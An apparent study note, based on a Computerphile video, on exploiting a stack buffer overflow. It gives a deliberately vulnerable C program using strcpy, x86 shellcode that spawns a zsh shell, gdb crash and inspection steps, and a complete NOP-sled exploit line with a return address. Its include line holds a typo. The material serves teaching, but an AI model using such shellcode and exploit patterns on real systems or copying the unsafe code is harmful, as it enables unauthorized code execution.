### __SIMPLE C CODE__

**code name: vuln.c**
```cpp
#include <stdio.h>
#inlcude <string.h>

int main (int argc, char** argv) 
{
	char buffer[500];
	strcpy(buffer, argv[1]);

	return 0;
}
```
...

compile code: **gcc vuln.c -o vuln**

___


### __STRING ASSEMBLY COMMAND TO RUN ZSH__

```bash
\x31\xc0\x83\xec\x01\x88\x04\x24\x68\x2f\x7a\x73\x68\x68\x2f\x62\x69\x6e\x68\x2f\x75
\x73\x72\x89\xe6\x50\x56\xb0\x0b\x89\xf3\x89\xe1\x31\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80
```

**LEGEND:**

**Total size** : 43 bytes
**xcd /x80** : Throw system interrupt / run system call

___

### __CRASH PROGRAM__

```bash
./vuln $(python -c 'print "\x41" * 504') : 504 > 500 (buffer size)
```
___

### __RUN DEBUGGER AND CRASH CODE__
```bash
gdb vuln

# disassemble main > see the Assembly code of main, just for information
(gdb) disas main

(gdb) run $(python -c 'print "\x41" * 508')

# Some Registers are populated by the Incorrect Address "\x41", hence segmentation fault.
(gdb) info registers   

# List 200 registers information starting from the stack pointer (sp) : MIGHT NOT BE HELPFUL
(gdb) x/200x $sp   

# Move the pointer backward and List num registers information.
(gdb) x/[num]x $sp - 500
```

___

### __EXPLOIT VULNERABILITY__

```bash
(gdb) run $(python -c 'print "\x90" * 425 + "\x31\xc0\x83\xec\x01\x88\x04\x24\x68\x2f\x7a\x73\x68\x68\x2f\x62\x69\x6e
					     \x68\x2f\x75\x73\x72\x89\xe6\x50\x56\xb0\x0b\x89\xf3\x89\xe1\x31\xd2\xcd
                                             \x80\xb0\x01\x31\xdb\xcd\x80" + "\xba\xfa\xff\xbf" * 10')

```

**Format** 	      : `run $(python -c 'print "No-Op COMMAND" * 425 + "ASSEMBLY COMMAND" + "RETURN ADDRESS"')`
**x90**	      : **No-Op sled** -> tell the cpu to run the next command. 
**RETURN ADDRESS**: Points To a Register storing a No-Op COMMAND to pass execution until we reach the ASSEMBLY COMMAND.

___

### __HOW TO CHOOSE RETURN ADDRESS__

```bash
# This will list registers and their value

(gdb) x/200x $sp -500
```

Choose one of the registers, pick in the middle, that contains the No-Op COMMAND. 

Source YouTube: Buffer Overflow Attack - Computerphile



